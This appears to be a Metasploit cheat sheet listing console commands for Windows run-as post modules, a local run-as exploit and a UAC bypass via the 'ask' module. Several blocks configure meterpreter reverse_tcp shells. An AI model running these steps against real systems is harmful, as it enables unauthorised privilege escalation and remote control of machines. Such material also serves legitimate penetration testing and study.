# Metasploit

## 01 - Usage

### 1.1 - Post Module

MSF Windows **Run As** Using PowerShell Post Module

```
msf > use post/windows/manage/run_as_psh

msf post(windows/manage/run_as_psh) > options

Module options (post/windows/manage/run_as_psh):  
  
  Name         Current Setting  Required  Description  
  ----         ---------------  --------  -----------  
  ARGS                          no        Arguments  
  CHANNELIZE   true             yes       Channelize output, required for reading output or interacting  
  DOMAIN                        no        Domain of user  
  EXE          cmd.exe          yes       Executable to run  
  HIDDEN       true             yes       Hide the window  
  INTERACTIVE  true             yes       Run interactively  
  PASS                          yes       Password of user  
  PATH         C:\              yes       Working Directory  
  SESSION                       yes       The session to run this module on  
  USER                          yes       User to run executable as  
  
  
View the full module info with the info, or info -d command.

msf post(windows/manage/run_as_psh) > set channelize <true | false>

msf post(windows/manage/run_as_psh) > set exe /path/to/malware.exe

msf post(windows/manage/run_as_psh) > set args [arguments]

msf post(windows/manage/run_as_psh) > set hidden <true | false>

msf post(windows/manage/run_as_psh) > set interactive <true | false>

msf post(windows/manage/run_as_psh) > set user <username>

msf post(windows/manage/run_as_psh) > set pass <password>

msf post(windows/manage/run_as_psh) > set domain [domain]

msf post(windows/manage/run_as_psh) > set path C:\\path\\to\\directory\\

msf post(windows/manage/run_as_psh) > set session <session_ID>

msf post(windows/manage/run_as_psh) > run
```

MSF Windows Manage Run Command As User Post Module. Note: if the password is wrong the post module will alter the password as administrator to execute commands.

```
msf > use post/windows/manage/run_as

msf post(windows/manage/run_as) > options

Module options (post/windows/manage/run_as):  
  
  Name      Current Setting  Required  Description  
  ----      ---------------  --------  -----------  
  CMD                        yes       Command to execute  
  CMDOUT    false            yes       Retrieve command output  
  DOMAIN                     yes       Domain to login with  
  PASSWORD                   yes       Password to login with  
  SESSION                    yes       The session to run this module on  
  USER                       yes       Username to login with  
  
  
View the full module info with the info, or info -d command.

msf post(windows/manage/run_as) > set cmdout <true | false>

msf post(windows/manage/run_as) > set cmd <commands> [arguments]

msf post(windows/manage/run_as) > set user <username>

msf post(windows/manage/run_as) > set password <password>

msf post(windows/manage/run_as) > set domain <domain>

msf post(windows/manage/run_as) > set session <session_ID>

msf post(windows/manage/run_as) > run
```

### 1.2 - Local Exploit Module

MSF Windows Run Command As User Exploit Module

```
msf > use exploit/windows/local/run_as

msf exploit(windows/local/run_as) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/run_as) > options

Module options (exploit/windows/local/run_as):

  Name                Current Setting  Required  Description
  ----                ---------------  --------  -----------
  APPLICATION_NAME                     no        Application to be executed (lpApplicationName)
  COMMAND_LINE                         no        Command line to execute (lpCommandLine)
  DOMAIN                               no        Domain to login with
  PASSWORD                             yes       Password to login with
  SESSION                              yes       The session to run this module on
  USER                                 yes       Username to login with
  USE_CUSTOM_COMMAND  false            yes       Specify custom APPLICATION_NAME and COMMAND_LINE


Payload options (windows/x64/meterpreter/reverse_tcp):

  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
  LHOST                      yes       The listen address (an interface may be specified)
  LPORT     4444             yes       The listen port
  
  
Exploit target:  
  
  Id  Name  
  --  ----  
  0   Automatic  
  
  
  
View the full module info with the info, or info -d command.  

msf exploit(windows/local/run_as) > set use_custom_command <true | false>

msf exploit(windows/local/run_as) > set application_name [C:\\path\\to\\program.exe]

msf exploit(windows/local/run_as) > set command_line [arguments]

msf exploit(windows/local/run_as) > set user <username>

msf exploit(windows/local/run_as) > set pass <password>

msf exploit(windows/local/run_as) > set domain [domain]

msf exploit(windows/local/run_as) > set lhost <IP>

msf exploit(windows/local/run_as) > set lport <PORT>

msf exploit(windows/local/run_as) > set exitfunc <seh | thread | process | none>

msf exploit(windows/local/run_as) > run
```

## BypassUAC via User Prompt

```
msf > use exploit/windows/local/ask

msf exploit(windows/local/ask) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/ask) > options 

Module options (exploit/windows/local/ask):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILENAME                    no        File name on disk
   PATH                        no        Location on disk, %TEMP% used if not set
   SESSION                     yes       The session to run this module on
   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf exploit(windows/local/ask) > set technique <EXE | PSH>

msf exploit(windows/local/ask) > set path [C:\\path\\to\\file.<exe | ps1>]

msf exploit(windows/local/ask) > set lhost <IP>

msf exploit(windows/local/ask) > set lport <PORT>

msf exploit(windows/local/ask) > set exitfunc <seh | thread | process | none>

msf exploit(windows/local/ask) > set exe::custom /path/to/local/custom_payload.exe

msf exploit(windows/local/ask) > set session <session_ID>

msf exploit(windows/local/ask) > run -j
```

## 02 - Use Case

TODO: Fill this info